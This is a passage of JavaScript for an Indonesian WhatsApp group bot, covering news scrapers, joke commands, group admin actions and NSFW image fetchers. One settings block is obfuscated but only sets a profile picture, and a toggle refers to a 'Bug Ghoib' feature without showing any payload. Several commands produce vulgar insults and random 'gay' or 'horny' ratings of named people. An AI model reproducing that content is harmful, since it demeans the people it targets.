case 'meme2':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme2?APIKEY=apivproject`)
haikal.sendMessage(m.chat, { image: anu, caption: `bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'ss': case 'ssweb': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
haikal.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted: m }).catch((err) => m.reply(jsonformat('*LINK NYA SLUR*')))
}
break
//=================================================//
case 'fajar-news':
if (isBan) throw sticBanLu(from)
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case "quotes":
if (isBan) throw sticBanLu(from)
var res = await Quotes()
teks += `\nAuthor: ${res.author}\n`
teks += `\nQuotes:\n`
teks += `${res.quotes}\n`
teks += ""
reply(teks)
break
//=================================================//
case "darkjoke": case "darkjokes":
if (isBan) throw sticBanLu(from)
var res = await Darkjokes()
teks = "*Darkjokes*"
haikal.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted: m })
break
//=================================================//
case 'cnn-news':
if (isBan) throw sticBanLu(from)
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'layarkaca-search':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
break
//=================================================//
case 'cnbc-news':
if (isBan) throw sticBanLu(from)
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'tribun-news':
if (isBan) throw sticBanLu(from)
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'indozone-news':
if (isBan) throw sticBanLu(from)
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'kompas-news':
if (isBan) throw sticBanLu(from)
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'detik-news':
if (isBan) throw sticBanLu(from)
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'daily-news':
if (isBan) throw sticBanLu(from)
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'inews-news':
if (isBan) throw sticBanLu(from)
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'okezone-news':
if (isBan) throw sticBanLu(from)
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'sindo-news':
if (isBan) throw sticBanLu(from)
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'tempo-news':
if (isBan) throw sticBanLu(from)
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'antara-news':
if (isBan) throw sticBanLu(from)
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case "kontan-news":
if (isBan) throw sticBanLu(from)
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case "merdeka-news":
if (isBan) throw sticBanLu(from)
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case "jalantikus-meme":
if (isBan) throw sticBanLu(from)
var res = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${res}`
teks += ""
haikal.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted: m })
break
//=================================================//
/*Random*/
 case 'apakah':
 if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: m })
break
//=================================================//
case 'bisakah':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: m })
break
//=================================================//
case 'bagaimanakah':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: m })
break
//=================================================//
case 'rate':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const te = ra[Math.floor(Math.random() * ra.length)]
haikal.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: m })
break
//=================================================//
case 'gantengcek':
case 'cekganteng':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const teng = gan[Math.floor(Math.random() * gan.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: m })
break
//=================================================//
case 'cantikcek':
case 'cekcantik':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const tik = can[Math.floor(Math.random() * can.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: m })
break
//=================================================//
case 'sangecek':
case 'ceksange':
case 'gaycek':
case 'cekgay':
case 'lesbicek':
case 'ceklesbi':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: m })
break
//=================================================//
case 'kapankah':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: m })
break
//=================================================//
case 'wangy':
if (isBan) throw sticBanLu(from)
if (!q) return reply (`Contoh : .wangy haikal`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
 m.reply(awikwok)
break
//=================================================//
case 'cekmati':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Invalid!\n\nYg mau di cek siapa kontol?`)
predea = await axios.get(`https://api.agify.io/?name=${q}`)
reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
break
//=================================================//
//=================================================//
case 'sc': {
if (isBan) throw sticBanLu(from)
reply('SC banghwA NI BOS')
}
break
//=================================================//
case 'banghwghoib': case 'welcome': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
m.reply('Sukses Telah mengaktifkan Bug Ghoib Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur Bug Admin Dan Penyapa, Harap Berhati-hati`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Bug Ghoib di group ini')
} else {
const komo = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!

⚠️ DANGERR ⚠️

 `, 
}
haikal.sendMessage(m.chat, komo)
}
}
break
case 'chat': {
if (isBan) throw sticBanLu(from)
if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
if (args[0] === 'mute') {
haikal.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unmute') {
haikal.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'archive') {
haikal.chatModify({archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
haikal.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'read') {
haikal.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unread') {
haikal.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'delete') {
haikal.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}
break
//=================================================//
//=================================================//
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
if (isBan) throw sticBanLu(from)
if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break
//=================================================//
//=================================================//
case 'mediafire': {
if (isBan) throw sticBanLu(from)
if (!text) throw '*Enter a Link Query!*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*The link you provided is not valid*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return m.reply('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait zimbot processing..._

*© banghw*`
reply(`${result4}`)
haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted: m }).catch ((err) => m.reply('*Failed to download File*'))
}
break
//=================================================//
case 'jodohku': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `👫Jodoh mu adalah
@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let ments = [me, jodoh]
let buttons = [
{ buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, jawab, haikal.user.name, m, {mentions: ments})
}
break
//=================================================//
case 'jadian': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤
@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, jawab, haikal.user.name, m, {mentions: menst})
}
break
//=================================================//
case 'react': {
 reactionMessage = {
react: {
text: '🇮🇩',
key: { remoteJid: from, fromMe: false, id: quoted.id }
}
}
haikal.sendMessage(from, reactionMessage)
}
break
//=================================================//
case 'join': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
await haikal.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'keluar': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
await haikal.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setexif': {
 if (isBan) throw sticBanLu(from)
 if (!text) throw `Example : ${prefix + command} packname|author`
global.packname = text.split("|")[0]
global.author = text.split("|")[1]
reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
}
break
//=================================================//
case 'kick': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'add': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'block': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setname': case 'setsubject': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await haikal.groupUpdateSubject(m.chat, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setdesc': case 'setdesk': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await haikal.groupUpdateDescription(m.chat, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'nsfw': {
if (isBan) throw sticBanLu(from)

if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfw) return m.reply('Sudah Aktif')
ntnsfw.push(from)
m.reply('Sukses Telah mengaktifkan Nsfw Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiNsfw) return m.reply('Sudah Non Aktif')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
m.reply('Sukses Mematikan Nsfw di group ini')
} else {
const anuu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan
\n\n*HELLO SANGEAN\n\n
trap
gasm
nwaifu
hneko `,
}
haikal.sendMessage(m.chat, anuu, `${global.botname}`, m)
}
}
break
case 'trap' :
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)
 const trapbot = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
haikal.sendMessage(m.chat, trapbot, { quoted: m }).catch(err => {
 return('Error!')
})
break
case 'hentai-neko' :
case 'hneko' :
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 const hnekobot = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
haikal.sendMessage(m.chat, hnekobot, { quoted: m }).catch(err => {
 return('Error!')
})
break
case 'hentai-waifu' :
case 'nwaifu' :
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const nwaifubot = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
haikal.sendMessage(m.chat, nwaifubot, { quoted: m }).catch(err => {
 return('Error!')
})
break
case 'gasm':
if (isBan) throw sticBanLu(from)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait) 
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
 const wbuttsss = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
haikal.sendMessage(m.chat, wbuttsss,{ quoted: m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'setppbot': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await haikal[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./baseikal/lib/myfunc');var {img}=await generateProfilePicture(media);await haikal[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await haikal[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
